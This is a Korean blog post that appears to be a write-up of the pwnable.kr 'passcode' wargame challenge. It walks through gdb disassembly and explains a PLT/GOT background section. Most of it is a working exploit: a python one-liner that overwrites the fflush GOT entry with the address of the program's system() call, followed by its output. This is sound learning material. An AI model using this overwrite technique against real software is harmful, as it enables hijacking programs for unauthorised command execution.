---
title: "pwnable.kr - Toddler's bottle #4 passcode"
date: 2020-03-08
categories:
  - Information Security
tags:
  - pwnable.kr
---

[pwnable.kr][pwnable.kr] Toddler's bottle의 #4 passcode 문제 풀이

gdb로 disas 해보면 대략 이렇게 생겨먹었다
~~~
(gdb) disas main
Dump of assembler code for function main:
   0x08048665 <+0>:     push   %ebp
   0x08048666 <+1>:     mov    %esp,%ebp
   0x08048668 <+3>:     and    $0xfffffff0,%esp
   0x0804866b <+6>:     sub    $0x10,%esp
   0x0804866e <+9>:     movl   $0x80487f0,(%esp)
   0x08048675 <+16>:    call   0x8048450 <puts@plt>
   0x0804867a <+21>:    call   0x8048609 <welcome>
   0x0804867f <+26>:    call   0x8048564 <login>
   0x08048684 <+31>:    movl   $0x8048818,(%esp)
   0x0804868b <+38>:    call   0x8048450 <puts@plt>
   0x08048690 <+43>:    mov    $0x0,%eax
   0x08048695 <+48>:    leave
   0x08048696 <+49>:    ret

(gdb) disas welcome
Dump of assembler code for function welcome:
   0x08048609 <+0>:     push   %ebp
   0x0804860a <+1>:     mov    %esp,%ebp
   0x0804860c <+3>:     sub    $0x88,%esp
   0x08048612 <+9>:     mov    %gs:0x14,%eax
   0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
   0x0804861b <+18>:    xor    %eax,%eax
   0x0804861d <+20>:    mov    $0x80487cb,%eax
   0x08048622 <+25>:    mov    %eax,(%esp)
   0x08048625 <+28>:    call   0x8048420 <printf@plt>
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804863e <+53>:    mov    $0x80487e3,%eax
   0x08048643 <+58>:    lea    -0x70(%ebp),%edx
   0x08048646 <+61>:    mov    %edx,0x4(%esp)
   0x0804864a <+65>:    mov    %eax,(%esp)
   0x0804864d <+68>:    call   0x8048420 <printf@plt>
   0x08048652 <+73>:    mov    -0xc(%ebp),%eax
   0x08048655 <+76>:    xor    %gs:0x14,%eax
   0x0804865c <+83>:    je     0x8048663 <welcome+90>
   0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
   0x08048663 <+90>:    leave
   0x08048664 <+91>:    ret

(gdb) disas login
Dump of assembler code for function login:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     sub    $0x28,%esp
   0x0804856a <+6>:     mov    $0x8048770,%eax
   0x0804856f <+11>:    mov    %eax,(%esp)
   0x08048572 <+14>:    call   0x8048420 <printf@plt>
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
=> 0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
   0x08048598 <+52>:    mov    $0x8048786,%eax
   0x0804859d <+57>:    mov    %eax,(%esp)
   0x080485a0 <+60>:    call   0x8048420 <printf@plt>
   0x080485a5 <+65>:    mov    $0x8048783,%eax
   0x080485aa <+70>:    mov    -0xc(%ebp),%edx
   0x080485ad <+73>:    mov    %edx,0x4(%esp)
   0x080485b1 <+77>:    mov    %eax,(%esp)
   0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
   0x080485b9 <+85>:    movl   $0x8048799,(%esp)
   0x080485c0 <+92>:    call   0x8048450 <puts@plt>
   0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
   0x080485cc <+104>:   jne    0x80485f1 <login+141>
   0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
   0x080485d5 <+113>:   jne    0x80485f1 <login+141>
   0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
   0x080485de <+122>:   call   0x8048450 <puts@plt>
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
   0x080485ef <+139>:   leave
   0x080485f0 <+140>:   ret
   0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
   0x080485f8 <+148>:   call   0x8048450 <puts@plt>
   0x080485fd <+153>:   movl   $0x0,(%esp)
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
~~~

welcome에서 보면 ebp-0x70 ~ ebp-0xc 를 user input으로 받는다
~~~
   0x0804862a <+33>:    mov    $0x80487dd,%eax
   0x0804862f <+38>:    lea    -0x70(%ebp),%edx
   0x08048632 <+41>:    mov    %edx,0x4(%esp)
   0x08048636 <+45>:    mov    %eax,(%esp)
   0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
~~~

passcode.c를 보면 scanf를 쓰는데 passcode1이 주소가 아니라 그냥 값이 들어감
~~~
void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);
~~~

저 passcode1에 해당하는 곳은 ebp-0x10임 
~~~
   0x08048577 <+19>:    mov    $0x8048783,%eax
   0x0804857c <+24>:    mov    -0x10(%ebp),%edx
   0x0804857f <+27>:    mov    %edx,0x4(%esp)
   0x08048583 <+31>:    mov    %eax,(%esp)
=> 0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
~~~

welcome과 login은 ebp가 같다. 그리고 welcome은 ebp-0x70 ~ ebp-0xc를 쓴다. 다시 말해 100자를 다 주면 마지막 4자는 ebp-0x10 ~ ebp-0xc를 덮어쓸 것이고 다시 말해 임의의 주소의 값을 내가 바꿀수 있다

그럼 뭘 바꾸지? scanf 이후에 보면 이런게 있다
~~~
   0x0804858b <+39>:    mov    0x804a02c,%eax
   0x08048590 <+44>:    mov    %eax,(%esp)
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
~~~

call은 결국 push eip, jmp address 이다. 근데 address에 해당하는 0x8048430을 보면

~~~
(gdb) disas /r 0x8048430,+0x10
Dump of assembler code from 0x8048430 to 0x8048440:
   0x08048430 <fflush@plt+0>:   ff 25 04 a0 04 08       jmp    *0x804a004
   0x08048436 <fflush@plt+6>:   68 08 00 00 00  push   $0x8
   0x0804843b <fflush@plt+11>:  e9 d0 ff ff ff  jmp    0x8048410
~~~

이렇게 생겼음. 즉 0x8048432를 조작하면 우리가 원하는 곳으로 jump할 수 있다. 

우리가 jump 하고 싶은 곳은 여기일 것이다
~~~
   0x080485e3 <+127>:   movl   $0x80487af,(%esp)
   0x080485ea <+134>:   call   0x8048460 <system@plt>
~~~

즉 96자 아무거나 + \x32\x84\x04\x08 한 다음에 scanf로 0x80485e3 = 134,514,147 하면 될 것 같다
~~~
python -c "print 'a'*96+'\x32\x84\x04\x08';print '134514147'" | ./passcode
~~~

...라고 생각했으나 잘못된 생각이었다.
instruction이 있는 곳은 read + execute라서 write가 안된다. 그래서 segmentation fault가 뜸

다시 한번 보면 jmp \*0x804a004 는 다시 말해 0x804a004를 dereference해서 jump한다는 거니까 이건 바꿀수 있을것 같다

~~~
passcode@pwnable:~$ python -c "print 'a'*96+'\x04\xa0\x04\x08';print '134514147'" | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
<tag output>
enter passcode1 : Now I can safely trust you that you have credential :)
~~~

푼것에 대해 좀 더 알아보자

~~~
passcode@pwnable:~$ file passcode
passcode: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.24, BuildID[sha1]=d2b7bd64f70e46b1b0eb7036b35b24a651c3666b, not stripped
~~~

passcode는 dynamically linked 되어 있다
dynamic link 방식으로 프로그램이 만들어지면 함수를 호출할때 PLT (Procedure Linkage Table) 를 참조한다. 아마 아래 부분일거다
~~~
   0x08048593 <+47>:    call   0x8048430 <fflush@plt>
~~~
PLT에서는 GOT로 점프한다. 그게 아래일 것이다
~~~
(gdb) disas /r 0x8048430,+0x10
Dump of assembler code from 0x8048430 to 0x8048440:
   0x08048430 <fflush@plt+0>:   ff 25 04 a0 04 08       jmp    *0x804a004
   0x08048436 <fflush@plt+6>:   68 08 00 00 00  push   $0x8
   0x0804843b <fflush@plt+11>:  e9 d0 ff ff ff  jmp    0x8048410
~~~
내가 푼 방법은 GOT로 점프하는 부분의 주소를 바꿔치기 한것이다
실제라면 GOT로 점프 한 후 dl_resolve를 통해 실제 함수 주소를 가져오고, GOT에 그 주소를 써준 후 해당 함수를 호출하는 식으로 된다고 한다


[pwnable.kr]: https://pwnable.kr

<!-- Sorry mom.. I got confused about scanf usage :( -->